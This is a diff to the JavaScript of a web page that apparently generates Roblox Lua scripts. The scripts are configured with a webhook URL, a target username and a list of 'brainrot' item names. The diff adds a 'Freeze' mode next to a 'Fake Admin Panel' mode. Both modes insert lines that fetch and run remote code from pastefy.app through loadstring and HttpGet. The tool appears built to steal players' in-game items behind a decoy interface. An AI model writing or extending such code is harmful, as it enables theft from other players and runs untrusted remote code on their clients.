@@ -541,6 +541,7 @@
       <div class="admin-mode-selector">
         <button class="admin-mode-btn active" onclick="setAdminMode('no-gui')">No GUI</button>
         <button class="admin-mode-btn" onclick="setAdminMode('admin-panel')">Fake Admin Panel</button>
+        <button class="admin-mode-btn" onclick="setAdminMode('freeze')">Freeze</button>
         <button class="admin-mode-btn" onclick="setAdminMode('custom')">Custom</button>
       </div>
       <div id="customAdminInput">
@@ -935,17 +936,22 @@ async function generate() {
         const names = [...selected];
         const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
-        let adminScriptPart = '';
+       let adminScriptPart = '';
         if (adminMode === 'admin-panel') {
             adminScriptPart = `
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
 end)
 `;
+        } else if (adminMode === 'freeze') {
+            adminScriptPart = `
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/cnm84Kkc/raw"))()
+end)
+`;
         } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
             adminScriptPart = customAdminLoadstring;
         }
-
         const script = `getgenv().WEBHOOK_URL = "${alias}"
 getgenv().TARGET_USERNAME = "${username}"
 getgenv().TARGET_BRAINROT = {
